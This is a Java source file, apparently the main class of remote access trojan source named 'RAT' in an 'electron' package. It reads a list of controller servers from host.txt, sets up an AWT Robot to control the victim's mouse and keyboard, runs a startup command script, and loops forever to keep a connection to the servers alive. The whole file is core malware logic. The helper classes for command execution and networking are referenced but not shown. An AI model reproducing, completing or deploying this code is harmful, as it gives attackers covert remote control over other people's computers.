package electron;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import electron.console.logger;
import electron.functions.Keyboard;
import electron.functions.MouseTweaks;
import electron.networking.CommandExecutor;
import electron.networking.Connection;
import electron.tools.FileOptions;
import electron.tools.cmd;

public class RAT {
	public static boolean isNativeImage;
	public static List<String> servers;

	public static void main(String[] args) throws IOException {
		logger.log("[RAT.main]: Loading...");
		String os = System.getProperty("os.name") + " " + System.getProperty("os.arch") + " "
				+ System.getProperty("os.version");
		/*
		 * Is this app compiled with GraalVM native-image? The best native-image fork to
		 * compile this app (supports AWT):
		 * 
		 * https://bell-sw.com/pages/downloads/native-image-kit/
		 */
		if (System.getProperty("java.home") == null) {
			isNativeImage = true;
		} else {
			isNativeImage = false;
		}
		logger.log("[RAT.main]: ---------------------------");
		logger.log("[RAT.main]: Installation data:");
		logger.log("[RAT.main]: OS: " + os);
		logger.log("[RAT.main]: Is native image: " + isNativeImage);
		logger.log("[RAT.main]: ---------------------------");
		// Loading network configuration
		logger.log("[RAT.main]: loading network data...");
		File host = new File("host.txt");
		List<String> servers;
		if (host.exists() == false) {
			if (isNativeImage) {
				logger.error("[RAT.main]: can't find external network config file for native-image executable.");
				logger.log("[RAT.main]: Bye.");
				return;
			}
			servers = loadConnectionData(true, host);
		} else {
			servers = loadConnectionData(false, host);
		}
		logger.log("[RAT.main]: Success.");
		// Initializing Robot
		logger.log("[RAT.main]: ---------------------------");
		logger.log("[RAT.main]: Initializing robot...");
		try {
			Robot r = new Robot();
			Connection.r = r;
			MouseTweaks.setRobot(r);
			Keyboard.setRobot(r);
			CommandExecutor.r = r;
			logger.log("[RAT.main]: robot: Success!");
		} catch (AWTException e) {
			logger.error("[RAT.main]: error initializing robot: " + e.getMessage());
		}
		logger.log("[RAT.main]: ---------------------------");
		/*
		 * You can launch your script with this app startup. (For example you can create
		 * crash handler)
		 */
		logger.log("[RAT.main]: Launching external command file...");
		if (cmd.isWindows) {
			cmd.run("command.bat");
		} else {
			cmd.run("sh command.sh");
		}
		logger.log("[RAT.main]: Done.");
		logger.log("[RAT.main]: ---------------------------");
		logger.log("[RAT.main]: Loaded.");
		// Keeping connection thread working
		RAT.servers = servers;
		Thread ServListener;
		while (true) {
			ServListener = new Connection(servers);
			ServListener.start();
			try {
				ServListener.join();
			} catch (InterruptedException e) {
				logger.error("[RAT.main]: connection thread was interrupted. Message: " + e.getMessage());
			}
		}
	}

	/**
	 * @param isInternalFile
	 * @param host
	 * @return List<String> servers
	 * @throws IOException
	 */
	private static List<String> loadConnectionData(boolean isInternalFile, File host) throws IOException {
		List<String> servers = new ArrayList<String>();
		if (isInternalFile) {
			InputStream in = RAT.class.getClassLoader().getResourceAsStream("electron/host.txt");
			String filedata = FileOptions.getInternalFileLineWithSeparator(in, "SPLITTER");
			for (String address : filedata.split("SPLITTER")) {
				servers.add(address);
				logger.log("[RAT.loadConnectionData]: found server: " + address);
			}
			logger.log("[RAT.loadConnectionData]: loaded " + servers.size() + " servers.");
			return servers;
		}
		// External file
		String filedata = FileOptions.getFileLineWithSeparator(FileOptions.getFileLines(host.getPath()), "SPLITTER");
		for (String address : filedata.split("SPLITTER")) {
			servers.add(address);
			logger.log("[RAT.loadConnectionData]: found server: " + address);
		}
		logger.log("[RAT.loadConnectionData]: loaded " + servers.size() + " servers.");
		return servers;
	}
}
